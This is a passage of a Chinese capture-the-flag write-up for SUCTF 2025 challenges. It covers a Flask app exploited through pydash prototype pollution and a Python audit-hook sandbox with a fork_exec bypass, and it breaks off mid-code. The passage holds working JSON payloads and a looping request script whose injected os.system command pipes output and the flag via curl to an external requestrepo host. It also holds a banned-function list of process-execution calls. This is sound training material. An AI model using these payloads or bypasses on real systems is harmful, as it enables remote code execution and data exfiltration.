class="hljs-string">&#x27;friendlinks.html&#x27;</span>, links=friend_links)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add_friendlink&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_friendlink</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    name = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    url = request.form.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> name <span class="hljs-keyword">and</span> url:<br>        friend_links.append(&#123;<span class="hljs-string">&quot;name&quot;</span>: name, <span class="hljs-string">&quot;url&quot;</span>: url&#125;)<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;friendlinks&#x27;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete_friendlink/&lt;int:index&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_friendlink</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= index &lt; <span class="hljs-built_in">len</span>(friend_links):<br>        <span class="hljs-keyword">del</span> friend_links[index]<br><br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;friendlinks&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/article&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">article</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    file_name = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_name:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=<span class="hljs-string">&#x27;&#x27;</span>, content=<span class="hljs-string">&quot;未提供文件名。&quot;</span>)<br><br>    blacklist = [<span class="hljs-string">&quot;waf.py&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklisted_file <span class="hljs-keyword">in</span> file_name <span class="hljs-keyword">for</span> blacklisted_file <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;大黑阔不许看&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_name.startswith(<span class="hljs-string">&#x27;articles/&#x27;</span>):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;无效的文件路径。&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> file_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> articles.values():<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=<span class="hljs-string">&quot;无权访问该文件。&quot;</span>)<br>    <br>    file_path = os.path.join(BASE_DIR, file_name)<br>    file_path = file_path.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            content = f.read()<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        content = <span class="hljs-string">&quot;文件未找到。&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        app.logger.error(<span class="hljs-string">f&quot;Error reading file <span class="hljs-subst">&#123;file_path&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        content = <span class="hljs-string">&quot;读取文件时发生错误。&quot;</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;article.html&#x27;</span>, file_name=file_name, content=content)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;pass&#x27;</span>)!=<span class="hljs-string">&quot;SUers&quot;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;nonono&quot;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            body = request.json<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> body:<br>                flash(<span class="hljs-string">&quot;No JSON data received&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;No JSON data received&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            key = body.get(<span class="hljs-string">&#x27;key&#x27;</span>)<br>            value = body.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flash(<span class="hljs-string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Missing required keys: &#x27;key&#x27; or &#x27;value&#x27;&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pwaf(key):<br>                flash(<span class="hljs-string">&quot;Invalid key format&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid key format&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cwaf(value):<br>                flash(<span class="hljs-string">&quot;Invalid value format&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid value format&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>            set_(user_data, key, value)<br><br>            flash(<span class="hljs-string">&quot;User data updated successfully&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;User data updated successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br><br>        <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>            flash(<span class="hljs-string">&quot;Invalid JSON data&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid JSON data&quot;</span>&#125;), <span class="hljs-number">400</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            flash(<span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>&#125;), <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, user_data=user_data)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>    flash(<span class="hljs-string">&quot;You have been logged out.&quot;</span>, <span class="hljs-string">&quot;info&quot;</span>)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>很多地方用不到，主要是Admin路由。</p><p><code>set_(user_data, key, value)</code></p><p>源码里引了pydash库的_set方法，初步断定是原型链污染。</p><p>把数字和<code>__loader__</code>过滤了，好像只有2没过滤。</p><p><a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/</a></p><p>loader被过滤了，可以用某个模块的<code>__spec__.__init__.__globals__</code>来拿sys。</p><blockquote><p>ps：这里也可以通过覆盖waf来使用loader</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__init__.__globals__.pwaf.__globals__.key_blacklist_bytes&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></blockquote><p>本地调试发现有globals，试试出不出网，不出网可以写静态文件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__init__.__globals__.globals.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;*;import os;os.system(&#x27;l&#x27;&#x27;s -al / | curl -d @- bxyyymgu.requestrepo.com&#x27;)&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>由于是公共靶机，这个打一次就不行了，很麻烦，搓了个脚本一直发：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url1 = <span class="hljs-string">&quot;http://27.25.151.48:5000/Admin?pass=SUers&quot;</span><br>url2 = <span class="hljs-string">&quot;http://27.25.151.48:5001/Admin?pass=SUers&quot;</span><br><br>cookies = &#123;<span class="hljs-string">&quot;session&quot;</span>:<span class="hljs-string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIn0.Z4MUfA.gaWUfOrunhWrYl1po8bZCWjzePk&quot;</span>&#125;<br><br>json = &#123;<br>    <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;__init__.__globals__.globals.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&quot;</span>,<br>    <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;*;import os;os.system(&#x27;l&#x27;&#x27;s -al / | curl -d @- bxyyymgu.requestrepo.com&#x27;)&quot;</span><br>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    res = requests.post(url1, cookies=cookies,json=json)<br>    <span class="hljs-built_in">print</span>(res.text)<br>    <span class="hljs-built_in">print</span>(requests.get(url1,cookies=cookies).text)<br><br>    res = requests.post(url2, cookies=cookies,json=json)<br>    <span class="hljs-built_in">print</span>(res.text)<br>    <span class="hljs-built_in">print</span>(requests.get(url2,cookies=cookies).text)<br>    time.sleep(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/SUCTF2025/c402bd00-1e3f-4882-a1f9-839a0a2b6ea5.png" alt="c402bd00-1e3f-4882-a1f9-839a0a2b6ea5"></p><p>有一个readflag，那直接执行了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;__init__.__globals__.globals.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;*;import os;os.system(&#x27;/read&#x27;&#x27;f&#x27;&#x27;lag | curl -d @- bxyyymgu.requestrepo.com&#x27;)&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/SUCTF2025/f7c7f588-5059-46d1-bd4c-c9036e382c8b.png" alt="f7c7f588-5059-46d1-bd4c-c9036e382c8b"></p><p>一血拿下！</p><p><code>SUCTF&#123;fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3&#125;</code></p><h1 id="SU-easyk8s-on-aliyun-REALLY-VERY-EASY"><a href="#SU-easyk8s-on-aliyun-REALLY-VERY-EASY" class="headerlink" title="SU_easyk8s_on_aliyun(REALLY VERY EASY)"></a>SU_easyk8s_on_aliyun(REALLY VERY EASY)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 遍历当前目录中的文件</span><br><span class="hljs-keyword">for</span> root, dirs, files <span class="hljs-keyword">in</span> os.walk(<span class="hljs-string">&quot;.&quot;</span>):<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        file_path = os.path.join(root, file)  <span class="hljs-comment"># 拼接文件的完整路径</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Reading file: <span class="hljs-subst">&#123;file_path&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                content = f.read()  <span class="hljs-comment"># 读取文件内容</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Content of <span class="hljs-subst">&#123;file_path&#125;</span>:\n<span class="hljs-subst">&#123;content&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error reading <span class="hljs-subst">&#123;file_path&#125;</span>: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>读到源码，audit.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br>DEBUG = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">audit_hook</span>(<span class="hljs-params">event, args</span>):<br>    audit_functions = &#123;<br>        <span class="hljs-string">&quot;os.system&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.Popen&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.run&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.call&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.check_call&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;subprocess.check_output&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;_posixsubprocess.fork_exec&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawn&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnlp&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnv&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.spawnve&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.exec&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execve&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execvp&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.execvpe&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;os.fork&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;shutil.run&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;ctypes.dlsym&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;,<br>        <span class="hljs-string">&quot;ctypes.dlopen&quot;</span>: &#123;<span class="hljs-string">&quot;ban&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> event <span class="hljs-keyword">in</span> audit_functions:<br>        <span class="hljs-keyword">if</span> DEBUG:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[DEBUG] found event <span class="hljs-subst">&#123;event&#125;</span>&quot;</span>)<br>        policy = audit_functions[event]<br>        <span class="hljs-keyword">if</span> policy[<span class="hljs-string">&quot;ban&quot;</span>]:<br>            strr = <span class="hljs-string">f&quot;AUDIT BAN : Banning FUNC:[<span class="hljs-subst">&#123;event&#125;</span>] with ARGS: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br>            <span class="hljs-built_in">print</span>(strr)<br>            <span class="hljs-keyword">raise</span> PermissionError(<span class="hljs-string">f&quot;[AUDIT BANNED]<span class="hljs-subst">&#123;event&#125;</span> is not allowed.&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            strr = <span class="hljs-string">f&quot;[DEBUG] AUDIT ALLOW : Allowing FUNC:[<span class="hljs-subst">&#123;event&#125;</span>] with ARGS: <span class="hljs-subst">&#123;args&#125;</span>&quot;</span><br>            <span class="hljs-built_in">print</span>(strr)<br>            <span class="hljs-keyword">return</span><br><br>sys.addaudithook(audit_hook)<br></code></pre></td></tr></table></figure><p>main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, url_for, flash, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">HINT: RCE me! </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>INDEX_HTML = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Python Executor&lt;/title&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">   &lt;h1&gt;Welcome to PyExector&lt;/h1&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   &lt;textarea id=&quot;code&quot; style=&quot;width: 100%; height: 200px;&quot; rows=&quot;10000&quot; cols=&quot;10000&quot; &gt;&lt;/textarea&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   &lt;button onclick=&quot;run()&quot;&gt;Run&lt;/button&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &lt;h2&gt;Output&lt;/h2&gt;</span><br><span class="hljs-string">    &lt;pre id=&quot;output&quot;&gt;&lt;/pre&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &lt;script&gt;</span><br><span class="hljs-string">        function run() &#123;</span><br><span class="hljs-string">            var code = document.getElementById(&quot;code&quot;).value;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            fetch(&quot;/run&quot;, &#123;</span><br><span class="hljs-string">                method: &quot;POST&quot;,</span><br><span class="hljs-string">                headers: &#123;</span><br><span class="hljs-string">                    &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="hljs-string">                &#125;,</span><br><span class="hljs-string">                body: JSON.stringify(&#123;</span><br><span class="hljs-string">                    code: code</span><br><span class="hljs-string">                &#125;)</span><br><span class="hljs-string">            &#125;)</span><br><span class="hljs-string">            .then(response =&gt; response.text())</span><br><span class="hljs-string">            .then(data =&gt; &#123;</span><br><span class="hljs-string">                document.getElementById(&quot;output&quot;).innerText = data;</span><br><span class="hljs-string">            &#125;);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &lt;/script&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():<br>    <span class="hljs-keyword">return</span> INDEX_HTML<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/run&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">runCode</span>():<br>    code = request.json[<span class="hljs-string">&quot;code&quot;</span>]<br>    cmd = [sys.executable,  <span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;os.getcwd()&#125;</span>/audit.py&quot;</span>]<br>    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)<br>    <span class="hljs-keyword">return</span> p.communicate(<span class="hljs-built_in">input</span>=code.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))[<span class="hljs-number">0</span>]<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>提示是让RCE。</p><p><a href="https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGQjb2if0ox#toc-35">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGQjb2if0ox#toc-35</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> _posixsubprocess<br><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;aaa&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>], [<span class="hljs-string">b&quot;/bin/ls&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, 